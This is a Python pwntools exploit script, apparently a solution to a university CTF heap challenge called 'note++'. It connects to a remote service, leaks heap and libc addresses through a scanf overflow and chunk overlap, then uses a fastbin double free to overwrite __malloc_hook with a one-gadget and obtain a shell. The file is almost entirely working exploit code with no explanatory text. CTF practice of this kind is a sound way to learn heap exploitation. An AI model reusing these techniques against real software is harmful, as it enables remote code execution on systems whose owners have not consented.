from pwn import *

#yen = process('./note++')
yen = remote('edu-ctf.csie.org',10181)

context.log_level = 'debug'
l = ELF('libc-2.23.so')
malloc_hook = 0x3c4b10 + 0x68

def add(size, msg, desc):
	yen.sendafter('>', str(1))
	yen.sendafter('Size: ', str(size))
	yen.sendafter('Note: ', msg)
	yen.sendlineafter('note: ', desc)

def add48(size, msg, desc):
	yen.sendafter('>', str(1))
	yen.sendafter('Size: ', str(size))
	yen.sendafter('Note: ', msg)
	yen.sendafter('note: ', desc)
	#yen.recvline()

def delete(index):
	yen.sendafter('>', str(3))
	yen.sendafter('Index: ', str(index))

def show():
	yen.sendafter('>', str(2))


## exploit ##
pause()
add(0x18,'BB','a1')
add(0x18,'CC','asldfjh')
add(0x18,'DD','asldfjh')
add(0x18,'EE','gg')
add(0x48,'A'*0x18 + p64(0x21),'hhh') #fake chunk
add(0x78,'TEST1','oooTEST1')
add(0x78,'TEST2','oooTEST2')#####
#add(0x78,'TEST3','oooTEST3')
delete(3)
delete(2)
delete(1)

# overflow scanf to show data 2 --> heap base & make data 2 double free-able
add48(0x18,'AA','A'*0x30)
show()
yen.recvuntil('Note 2:')
yen.recvuntil('Data: ')
heap_base = u64(yen.recvline()[:6] + '\0\0') -0x60
success('heap base--> %s'%hex(heap_base))

# double free data 2 and get fake chunk
delete(0)
delete(2)
add(0x18,p64(heap_base+0xa0),'yenyencute')
add(0x18,'QQ','a1')
add(0x18,'PP','asldfjh')
add(0x18,'GJMI','iamfake') #fakechunk

# heap overlap to create unsorted chunk
delete(4)
add(0x48,'A'*0x18 + p64(0xb1),'heapoverlap!')#####
delete(7) #free unsorted chunk (size 0xb0) --> libc addr in data 8

# overflow scanf again to show data 8 --> get libc base
delete(6)
add48(0x78,'TEST3','A'*0x30)
show()
yen.recvuntil('Note 7:')
yen.recvuntil('Data: ')
l.address = u64(yen.recvline()[:6] + '\0\0') - malloc_hook 
success('libc--> %s'%hex(l.address))
pause()
# clear garbage
for i in range(7):
	delete(i)
# clear unsorted bin
add(0x58,'cookie0','cookie0') #0
add(0x68,'cookie1','cookie1') #1
#double free and get flag QQQQ
add(0x68,'FLAG2','FLAG2') #2
add(0x68,'FLAG1','FLAG1') #3
delete(3)
delete(2)
add48(0x68,'trash','A'*0x30)
delete(1)
delete(3)
add(0x68,p64(l.sym.__malloc_hook - 0x10 - 0x03),'heyheycomeonflag') #1
pause()
add(0x68,'FLAG3','FLAG3') #3
add(0x68,'FLAG4','FLAG4') #4
add(0x68,'AAA'+p64(l.address+0xf02a4),'FLAG5') #5	
yen.interactive()
#add(str(l.search('/bin/sh').next()),'FLAG2','FLAG1')
#yen.interactive()

# free at 0x3c67a8

